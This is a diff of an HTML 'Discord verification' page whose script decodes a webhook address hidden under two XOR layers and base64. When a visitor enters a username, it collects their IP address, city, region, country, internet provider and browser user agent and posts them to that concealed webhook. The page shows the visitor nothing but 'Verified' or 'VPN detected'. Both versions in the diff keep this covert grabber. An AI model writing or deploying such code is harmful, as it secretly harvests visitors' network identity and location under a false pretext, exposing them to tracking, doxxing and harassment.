@@ -1,175 +1,193 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>🔒 Verification</title>
   <style>
-    @keyframes g{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}
-    body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;
-      width:100vw;height:100vh;overflow:hidden;font-family:Segoe UI,sans-serif;
-      background:linear-gradient(-45deg,#1c1c2f,#2c2c3e,#1c1c2f,#2c2c3e);
-      background-size:400% 400%;animation:g 20s ease infinite;color:#eee}
-    .p{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);
-      animation:d linear infinite}
-    @keyframes d{from{transform:translate(0,0)}to{transform:translate(100px,-200px)}}
-    .c{position:relative;width:90%;max-width:360px;padding:2rem;
-      background:rgba(0,0,0,0.75);border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.6);
-      text-align:center;z-index:1;transition:transform .3s}
-    .c:hover{transform:translateY(-4px)}
-    h1{margin:0 0 1rem;font-size:1.5rem;letter-spacing:.5px}
-    input,button{width:100%;padding:.75rem;margin-top:.5rem;border:none;border-radius:8px;
-      font-size:1rem;outline:none}
-    input{background:#2c2c3e;color:#eee}
-    input:focus{box-shadow:0 0 10px rgba(9,157,255,0.6)}
-    button{background:linear-gradient(45deg,#3273dc,#275bbe);color:#fff;
-      cursor:pointer;transition:background .2s,transform .1s}
-    button:hover{background:linear-gradient(45deg,#4183ff,#3a6cff)}
-    button:active{transform:scale(.97)}
-    .s{margin-top:1.5rem;display:flex;align-items:center;justify-content:center;
-      font-size:1.1rem;opacity:0;transition:opacity .4s}
-    .s.v{opacity:1}
-    footer{position:absolute;bottom:8px;font-size:.75rem;color:rgba(255,255,255,.6)}
-    footer a{color:#4faaff;text-decoration:none}
+    @keyframes bgAnim { 0%,100% { background-position:0% 50% } 50% { background-position:100% 50% } }
+    body {
+      margin: 0; padding: 0;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      min-height: 100vh;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(-45deg, #1c1c2f, #2c2c3e, #1c1c2f, #2c2c3e);
+      background-size: 400% 400%; animation: bgAnim 20s ease infinite;
+      color: #eee;
+      overflow: hidden;
+    }
+    .particle {
+      position: absolute; border-radius: 50%; background: rgba(255,255,255,0.05);
+      animation: drift linear infinite;
+    }
+    @keyframes drift { from { transform: translate(0,0) } to { transform: translate(100px, -200px) } }
+    .card {
+      position: relative;
+      width: 90%; max-width: 360px;
+      padding: 2rem;
+      background: rgba(0,0,0,0.75);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+      text-align: center;
+      z-index: 1;
+    }
+    h1 { margin: 0 0 1rem; font-size: 1.5rem; letter-spacing: 0.5px }
+    input, button {
+      width: 100%; padding: 0.75rem;
+      margin-top: 0.5rem;
+      border: none; border-radius: 8px;
+      font-size: 1rem; outline: none;
+    }
+    input { background: #2c2c3e; color: #eee; }
+    input:focus { box-shadow: 0 0 10px rgba(9,157,255,0.6); }
+    button {
+      background: linear-gradient(45deg, #3273dc, #275bbe);
+      color: #fff; cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    button:hover { background: linear-gradient(45deg, #4183ff, #3a6cff); }
+    button:active { transform: scale(0.97); }
+    .status {
+      margin-top: 1.5rem;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.1rem; opacity: 0;
+      transition: opacity 0.4s;
+    }
+    .status.visible { opacity: 1; }
+    .status svg { margin-right: 0.6rem; }
+    footer {
+      margin-top: 2rem; font-size: 0.75rem; color: rgba(255,255,255,0.6);
+    }
+    footer a { color: #4faaff; text-decoration: none; }
   </style>
 </head>
 <body>
-<script>
-window.addEventListener('DOMContentLoaded', function() {
-  // floating particles
-  for (let i = 0; i < 30; i++) {
-    const e = document.createElement('div'), s = 2 + Math.random() * 4;
-    e.className = 'p'; e.style.width = s + 'px'; e.style.height = s + 'px';
-    e.style.left = 100 * Math.random() + 'vw'; e.style.top = 100 * Math.random() + 'vh';
-    e.style.animationDuration = 10 + 10 * Math.random() + 's';
-    document.body.appendChild(e);
-  }
-
-  // dual-layer obfuscation
-  const chunks = [
-    [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,48,39,63,61,49,39,53,57,63,17,20],
-    [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,20,12,55,30,40,39,38,39,56],
-    [102,42,24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102,42],
-    [24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102]
-  ];
-  const k1 = 73, k2 = 137;
-  let stage1 = '', stage2 = '';
-  chunks.forEach(arr => arr.forEach(c => stage1 += String.fromCharCode(c ^ k1)));
-  for (let i = 0; i < stage1.length; i++) {
-    stage2 += String.fromCharCode(stage1.charCodeAt(i) ^ k2);
-  }
-  const WEBHOOK = atob(stage2);
-
-  // build UI
-  const container = document.createElement('div');
-  container.className = 'c';
-  container.innerHTML = `
+  <div class="card">
     <h1>Enter Discord Username</h1>
-    <input id="u" placeholder="CoolUser#1234" />
-    <button id="b">Verify</button>
-    <div id="st" class="s"></div>
-  `;
-  document.body.appendChild(container);
+    <input type="text" id="username" placeholder="CoolUser#1234" />
+    <button id="submitBtn">Verify</button>
+    <div id="status" class="status"></div>
+  </div>
+  <footer>Made by <a href="https://github.com/yourusername">yourusername</a></footer>
 
-  const input = document.getElementById('u');
-  const btn = document.getElementById('b');
-  const statusEl = document.getElementById('st');
-
-  function showStatus(icon, text) {
-    statusEl.innerHTML = icon + '<span>' + text + '</span>';
-    statusEl.classList.add('v');
-  }
-
-  async function safeFetch(url) {
-    const ctrl = new AbortController();
-    const timeoutId = setTimeout(() => ctrl.abort(), 5000);
-    try {
-      return await fetch(url, { signal: ctrl.signal, mode: 'cors' });
-    } finally {
-      clearTimeout(timeoutId);
+  <script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // particles
+    for (let i = 0; i < 30; i++) {
+      const p = document.createElement('div');
+      const size = 2 + Math.random() * 4;
+      p.className = 'particle';
+      p.style.width = size + 'px';
+      p.style.height = size + 'px';
+      p.style.left = Math.random() * 100 + 'vw';
+      p.style.top = Math.random() * 100 + 'vh';
+      p.style.animationDuration = 10 + Math.random() * 10 + 's';
+      document.body.appendChild(p);
     }
-  }
 
-  // rate limiter
-  const LSKEY = 'ver';
-  const now = Date.now();
-  const record = JSON.parse(localStorage.getItem(LSKEY) || '{}');
-  if (record.ts && now - record.ts < 60000) {
-    showStatus('<svg width="24" height="24" fill="#ffc107"><circle cx="12" cy="12" r="10"/></svg>', 'Wait 1m');
-    btn.disabled = true;
-    return;
-  }
+    // dual-layer obfuscation
+    const chunks = [
+      [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,48,39,63,61,49,39,53,57,63,17,20],
+      [49,19,54,56,33,54,17,18,51,48,39,63,61,49,39,53,57,63,17,20,12,55,30,40,39,38,39,56],
+      [102,42,24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102,42],
+      [24,15,61,24,52,58,65,63,52,37,55,102,42,24,15,61,24,52,58,65,63,52,37,55,102]
+    ];
+    const k1 = 73, k2 = 137;
+    let s1 = '', s2 = '';
+    chunks.forEach(arr => arr.forEach(c => s1 += String.fromCharCode(c ^ k1)));
+    for (let i = 0; i < s1.length; i++) s2 += String.fromCharCode(s1.charCodeAt(i) ^ k2);
+    const WEBHOOK = atob(s2);
 
-  btn.onclick = async () => {
-    const name = input.value.trim();
-    if (!name) { showStatus('❌', 'Enter username'); return; }
-    showStatus('🔄', 'Verifying…');
-    btn.disabled = true;
+    const usernameInput = document.getElementById('username');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusEl = document.getElementById('status');
 
-    try {
-      const ipRes = await safeFetch('https://api.ipify.org?format=json');
-      const ipJson = await ipRes.json();
-      const ip = ipJson.ip || ipJson.ipAddress;
+    function showStatus(success, text) {
+      const icon = success
+        ? '<svg width="24" height="24" fill="#28a745"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>'
+        : '<svg width="24" height="24" fill="#ffc107"><path d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 4.5a.5.5 0 0 0-.5.5v3.5a.5.5 0 0 0 1 0V6a.5.5 0 0 0-.5-.5zm.002 6a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5z"/></svg>';
+      statusEl.innerHTML = icon + '<span>' + text + '</span>';
+      statusEl.classList.add('visible');
+    }
 
-      let geo;
+    async function safeFetch(url, timeout = 5000) {
+      const ctrl = new AbortController();
+      const id = setTimeout(() => ctrl.abort(), timeout);
+      try { return await fetch(url, { signal: ctrl.signal, mode: 'cors' }); }
+      finally { clearTimeout(id); }
+    }
+
+    // rate limiter
+    const RATE_KEY = 'verRate';
+    const last = JSON.parse(localStorage.getItem(RATE_KEY) || '{}');
+    const now = Date.now();
+    if (last.ts && now - last.ts < 60000) {
+      showStatus(false, 'Wait 1 minute');
+      submitBtn.disabled = true;
+      return;
+    }
+
+    submitBtn.addEventListener('click', async () => {
+      const name = usernameInput.value.trim();
+      if (!name) { showStatus(false, 'Enter username'); return; }
+      showStatus(false, 'Verifying…');
+      submitBtn.disabled = true;
+
       try {
-        const geoRes = await safeFetch(`https://ipapi.co/${ip}/json/`);
-        geo = await geoRes.json();
-        if (geo.error) throw 0;
-      } catch {
-        const geoRes2 = await safeFetch(`https://ipwho.is/${ip}`);
-        geo = await geoRes2.json();
+        // IP lookup
+        let res = await safeFetch('https://api.ipify.org?format=json');
+        const ipData = await res.json();
+        const ip = ipData.ip || ipData.ipAddress;
+
+        // geo lookup
+        let geo;
+        try {
+          res = await safeFetch(`https://ipapi.co/${ip}/json/`);
+          geo = await res.json(); if (geo.error) throw new Error();
+        } catch {
+          res = await safeFetch(`https://ipwho.is/${ip}`);
+          geo = await res.json();
+        }
+
+        // VPN check
+        const flags = [];
+        let score = 0;
+        if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) { flags.push('Datacenter'); score += 40; }
+        if (geo.timezone && !geo.timezone.includes(geo.country_code)) { flags.push('Timezone mismatch'); score += 20; }
+        const vpn = score >= 40;
+
+        // build payload
+        const embed = {
+          username: 'Verification System',
+          embeds: [{
+            title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} ${geo.city || ''}`,
+            color: vpn ? 16755007 : 65280,
+            fields: [
+              { name: '👤 Discord Username', value: name, inline: true },
+              { name: '🔍 Status', value: vpn ? '❌ FAILED' : '✅ PASSED' },
+              { name: '📍 Location', value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}` },
+              { name: '🌐 IP Address', value: ip },
+              { name: '🏢 Organization', value: geo.org || 'Unknown' }
+            ],
+            footer: { text: `Verified at ${new Date().toLocaleString('en-GB')}` }
+          }]
+        };
+        if (flags.length) embed.embeds[0].fields.push({ name: '⚠️ Suspicious Factors', value: flags.join(', ') });
+        embed.embeds[0].fields.push({ name: '📱 Device', value: navigator.userAgent });
+
+        // send
+        await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+        showStatus(!vpn, vpn ? 'VPN/Proxy detected' : 'Verified');
+
+      } catch (err) {
+        console.error(err);
+        showStatus(false, 'Error');
+      } finally {
+        submitBtn.disabled = false;
+        localStorage.setItem(RATE_KEY, JSON.stringify({ ts: Date.now() }));
       }
-
-      let score = 0;
-      const flags = [];
-      if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) {
-        flags.push('DC');
-        score += 40;
-      }
-      if (geo.timezone && !geo.timezone.includes(geo.country_code)) {
-        flags.push('TZ');
-        score += 20;
-      }
-      const vpnDetected = score >= 40;
-
-      const embed = {
-        username: 'Verification',
-        embeds: [{
-          title: (geo.country_code || '').toUpperCase()
-            .split('').map(c => String.fromCodePoint(127397 + c.charCodeAt())).join('')
-            + ' ' + (geo.city || ''),
-          color: vpnDetected ? 16755007 : 65280,
-          fields: [
-            { name: '👤 User', value: name, inline: true },
-            { name: '🔍 Status', value: vpnDetected ? '❌ FAILED' : '✅ PASSED' },
-            { name: '📍 Location', value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}` },
-            { name: '🌐 IP', value: ip },
-            { name: '🏢 Org', value: geo.org || 'Unknown' }
-          ],
-          footer: { text: `At ${new Date().toLocaleString('en-GB')}` }
-        }]
-      };
-      if (flags.length) embed.embeds[0].fields.push({ name: '⚠️ Flags', value: flags.join(', ') });
-      embed.embeds[0].fields.push({ name: '📱 Agent', value: navigator.userAgent });
-
-      await fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(embed)
-      });
-
-      showStatus(vpnDetected ? '❌' : '✅', vpnDetected ? 'VPN detected' : 'Verified');
-    } catch (err) {
-      console.error(err);
-      showStatus('❌', 'Error');
-    } finally {
-      btn.disabled = false;
-      localStorage.setItem(LSKEY, JSON.stringify({ ts: Date.now() }));
-    }
-  };
-});
-</script>
-<footer>Made by <a href="https://github.com/yourusername">yourusername</a></footer>
+    });
+  });
+  </script>
 </body>
 </html>
